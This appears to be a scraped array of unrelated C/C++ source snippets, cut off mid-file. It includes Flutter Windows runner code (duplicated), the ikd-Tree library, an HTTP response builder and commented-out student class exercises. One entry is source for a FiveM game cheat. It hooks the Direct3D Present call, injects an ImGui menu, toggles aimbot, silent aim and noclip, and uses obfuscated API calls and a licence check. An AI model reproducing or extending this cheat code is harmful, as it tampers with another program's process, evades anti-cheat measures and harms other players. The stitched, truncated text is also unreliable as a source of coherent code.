Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"ikd_Tree.h\"\n\n/*\nDescription: ikd-Tree: an incremental k-d tree for robotic applications \nAuthor: Yixi Cai\nemail: yixicai@connect.hku.hk\n*/\n\ntemplate <typename PointType>\nKD_TREE<PointType>::KD_TREE(float delete_param, float balance_param, float box_length)\n{\n    delete_criterion_param = delete_param;\n    balance_criterion_param = balance_param;\n    downsample_size = box_length;\n    Rebuild_Logger.clear();\n    termination_flag = false;\n    start_thread();\n}\n\ntemplate <typename PointType>\nKD_TREE<PointType>::~KD_TREE()\n{\n    stop_thread();\n    Delete_Storage_Disabled = true;\n    delete_tree_nodes(&Root_Node);\n    PointVector().swap(PCL_Storage);\n    Rebuild_Logger.clear();\n}\n\n\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitializeKDTree(float delete_param, float balance_param, float box_length)\n{\n    Set_delete_criterion_param(delete_param);\n    Set_balance_criterion_param(balance_param);\n    set_downsample_param(box_length);\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitTreeNode(KD_TREE_NODE *root)\n{\n    root->point.x = 0.0f;\n    root->point.y = 0.0f;\n    root->point.z = 0.0f;\n    root->node_range_x[0] = 0.0f;\n    root->node_range_x[1] = 0.0f;\n    root->node_range_y[0] = 0.0f;\n    root->node_range_y[1] = 0.0f;\n    root->node_range_z[0] = 0.0f;\n    root->node_range_z[1] = 0.0f;\n    root->radius_sq = 0.0f;\n    root->division_axis = 0;\n    root->father_ptr = nullptr;\n    root->left_son_ptr = nullptr;\n    root->right_son_ptr = nullptr;\n    root->TreeSize = 0;\n    root->invalid_point_num = 0;\n    root->down_del_num = 0;\n    root->point_deleted = false;\n    root->tree_deleted = false;\n    root->need_push_down_to_left = false;\n    root->need_push_down_to_right = false;\n    root->point_downsample_deleted = false;\n    root->working_flag = false;\n    pthread_mutex_init(&(root->push_down_mutex_lock), NULL);\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::size()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            return Root_Node->TreeSize;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return Treesize_tmp;\n        }\n    }\n}\n\ntemplate <typename PointType>\nBoxPointType KD_TREE<PointType>::tree_range()\n{\n    BoxPointType range;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n            pthread_mutex_unlock(&working_flag_mutex);\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    return range;\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::validnum()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n            return (Root_Node->TreeSize - Root_Node->invalid_point_num);\n        else\n            return 0;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize - Root_Node->invalid_point_num;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return -1;\n        }\n    }\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::root_alpha(float &alpha_bal, float &alpha_del)\n{\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        alpha_bal = Root_Node->alpha_bal;\n        alpha_del = Root_Node->alpha_del;\n        return;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            alpha_bal = Root_Node->alpha_bal;\n            alpha_del = Root_Node->alpha_del;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return;\n        }\n        else\n        {\n            alpha_bal = alpha_bal_tmp;\n            alpha_del = alpha_del_tmp;\n          ",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   HTTPResponseBuilder.cpp                            :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: migarci2 <migarci2@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/04/06 15:41:13 by migarci2          #+#    #+#             */\n/*   Updated: 2024/04/06 15:56:19 by migarci2         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"HTTPResponseBuilder.hpp\"\n\nvoid\tHTTPResponseBuilder::buildStatusLine(std::string &buildResponse, const HTTPResponse &response)\n{\n\tbuildResponse += \"HTTP/\";\n\tbuildResponse += response.getHttpVersion();\n\tbuildResponse += \" \";\n\tstd::stringstream ss;\n\tss << response.getStatusCode();\n\tbuildResponse += ss.str();\n\tbuildResponse += \" \";\n\tbuildResponse += response.getStatusMessage();\n\tbuildResponse += \"\\r\\n\";\n}\n\nvoid\tHTTPResponseBuilder::buildHeaders(std::string &buildResponse, const HTTPResponse &response)\n{\n\tstd::map<std::string, std::string>::const_iterator it;\n    for (it = response.getHeaders().begin(); it != response.getHeaders().end(); ++it)\n\t{\n        buildResponse += it->first;\n        buildResponse += \": \";\n        buildResponse += it->second;\n        buildResponse += \"\\r\\n\";\n    }\n}\n\nstd::string HTTPResponseBuilder::buildResponse(const HTTPResponse &response)\n{\n\tstd::string buildResponse;\n\n\tbuildStatusLine(buildResponse, response);\n\tbuildHeaders(buildResponse, response);\n\tbuildResponse += \"\\r\\n\";\n\tbuildResponse += response.getBody();\n\treturn buildResponse;\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//TASK 1\r\n// #include<iostream>\r\n// using namespace std;\r\n// class shape\r\n// {\r\n//   private:\r\n//   float height,width,length;\r\n//   public:\r\n//   shape()\r\n//   {\r\n//     height=0;\r\n//     width=0;\r\n//     length=0;\r\n//   }  \r\n//   shape(float h,float w,float l)\r\n//   {\r\n//     height=h;\r\n//     width=w;\r\n//     length=l;\r\n//   }\r\n//   void setheight(float h)\r\n//   {\r\n//     height=h;\r\n//   }\r\n//   void setwidth(float w)\r\n//   {\r\n//     width=w;\r\n//   }\r\n//   void setlength(float l)\r\n//   {\r\n//     length=l;\r\n//   }\r\n//   float getheight()\r\n//   {\r\n//     return height;\r\n//   }\r\n//   float getwidth()\r\n//   {\r\n//     return width;\r\n//   }\r\n//   float getlength()\r\n//   {\r\n//     return length;\r\n//   }\r\n//   void calculateArea()\r\n//   {\r\n//     cout<<\"Area calculation function specifier\"<<endl;\r\n//   }\r\n//   void calculatePerimeter()\r\n//   {\r\n//     cout<<\"Perimeter calculation function specifier\"<<endl;\r\n//   }\r\n//   void print()\r\n//   {\r\n//     cout<<\"length is:\"<<length<<endl;\r\n//     cout<<\"width is:\"<<width<<endl;\r\n//     cout<<\"height is:\"<<height<<endl;\r\n//   }\r\n\r\n\r\n// };\r\n// class circle :public shape\r\n// { \r\n//     private:\r\n//     float radius,area,perimeter;\r\n//     public:\r\n//     circle(){};\r\n//     void set_radius(float r)\r\n//     {\r\n//         radius = r;\r\n//     }\r\n//     void calculateArea()\r\n//     {\r\n//         area=3.1417*radius*radius;\r\n//     }\r\n//     float getarea() const\r\n//     {\r\n//         return area;\r\n//     }\r\n//     void  calculatePerimeter()\r\n//     {\r\n//           perimeter=2*3.1417*radius;\r\n         \r\n//     }\r\n//     float getperimeter() const\r\n//     {\r\n//         return perimeter;\r\n//     }\r\n//       void print()\r\n//       {\r\n//         cout<<\"Area of circle with radius: \"<<radius<<\" is:\"<<area<<endl;\r\n//         cout<<\"Perimeter of circle with radius: \"<<radius<<\" is:\"<<perimeter<<endl;\r\n//       }\r\n\r\n// };\r\n// class rectangle : public shape\r\n// {\r\n//       private:\r\n//       float length,width,area,perimeter;\r\n//       public:\r\n//       shape c;\r\n//      //length=c.getlength();\r\n//      rectangle(float l,float w):length(l),width(w){};\r\n//      void calculateArea()\r\n//      {\r\n//         area=length*width;\r\n//         //cout<<\"Area is\"<<area<<endl;\r\n//      }\r\n//      void calculatePerimeter()\r\n//      {\r\n//         perimeter=2*(length*width);\r\n//        // cout<<\"Perimeter is\"<<perimeter<<endl;\r\n//      }\r\n//     void print()\r\n\r\n//     {\r\n//         cout<<\"Perimeter of rectangle with length: \"<<length<<\" and width: \"<<width<<\" is:\"<<perimeter<<endl;\r\n//         cout<<\"Area of rectangle with length: \"<<length<<\" and width: \"<<width<<\" is:\"<<area<<endl;\r\n//     }\r\n\r\n// };\r\n// class triangle :public shape\r\n// {\r\n//      private:\r\n//      float base,height,h,area,perimeter;\r\n//      public:\r\n//      triangle(float b,float h,float h1):base(b),height(h),h(h1){};\r\n//      void calculateArea()\r\n//      {\r\n//         area=(base*height)/2;\r\n    \r\n//      }\r\n//      void calculatePerimeter()\r\n//      {\r\n//         perimeter=base+height+h;\r\n//      }\r\n//      void print()\r\n//      {\r\n//         cout<<\"\\nperimeter of triangle is:\"<<perimeter<<endl;\r\n//         cout<<\"Area of triangle is: \"<<area<<endl;\r\n//      }\r\n\r\n    \r\n// };\r\n// int main()\r\n// {\r\n//     shape *obj;\r\n//     obj=new shape(); \r\n    \r\n\r\n//     circle *obj1;\r\n//     obj1=new circle();\r\n//     obj1->set_radius(5);\r\n//     obj1->calculateArea();\r\n//     obj1-> calculatePerimeter();\r\n//     cout<<\"****************************\"<<endl;\r\n//     cout<<\"For circle: \\n\"<<endl;\r\n//     obj1->print();\r\n\r\n//  rectangle *obj3;\r\n//  obj3=new rectangle(5,3);\r\n//  obj3->calculateArea();\r\n//  obj3->calculatePerimeter();\r\n//   cout<<\"****************************\"<<endl;\r\n//  cout<<\"For rectangle:\\n\"<<endl;\r\n//  obj3->print();\r\n \r\n//  triangle *obj2;\r\n//  obj2=new triangle(5.4,8.6,4);\r\n//  obj2->calculateArea();\r\n//  obj2->calculatePerimeter();\r\n//   cout<<\"****************************\"<<endl;\r\n//   cout<<\"For triangle:\"<<endl;\r\n//  obj2->print();\r\n\r\n\r\n// delete obj,obj1,obj2,obj3;\r\n//     return 0;\r\n// }\r\n\r\n\r\n\r\n\r\n\r\n//Task 3\r\n\r\n// #include<iostream>\r\n// using namespace std;\r\n// class Animals\r\n// {\r\n//   public:\r\n//   void move()\r\n//   {\r\n//      cout<<\"Animals can move\"<<endl;\r\n//   }\r\n//   void eat()\r\n//   {\r\n//        cout<<\"Animals can eat\"<<endl;\r\n//   }\r\n// };\r\n// class lions:public Animals\r\n// {\r\n//     public:\r\n//     lions()\r\n//     {\r\n\r\n//     }\r\n//     void move  ()\r\n//     {\r\n//         cout<<\"Lion can run faster\"<<endl;\r\n//     }\r\n//     void eat()\r\n//     {\r\n//         cout<<\"Lions eat meat\"<<endl;\r\n//     }\r\n// };\r\n// class Elephants:public Animals\r\n// {\r\n//     public:\r\n//      void move  ()\r\n//     {\r\n//         cout<<\"Elephant can walk slowly\"<<endl;\r\n//     }\r\n//     void eat()\r\n//     {\r\n//         cout<<\"Elephants eat grass.\"<<endl;\r\n//     }\r\n// };\r\n// class Snakes:public Animals\r\n// {\r\n//     public:\r\n//      void move  ()\r\n//     {\r\n//         cout<<\"Snake can move on ground\"<<endl;\r\n//     }\r\n//     void eat()\r\n//",
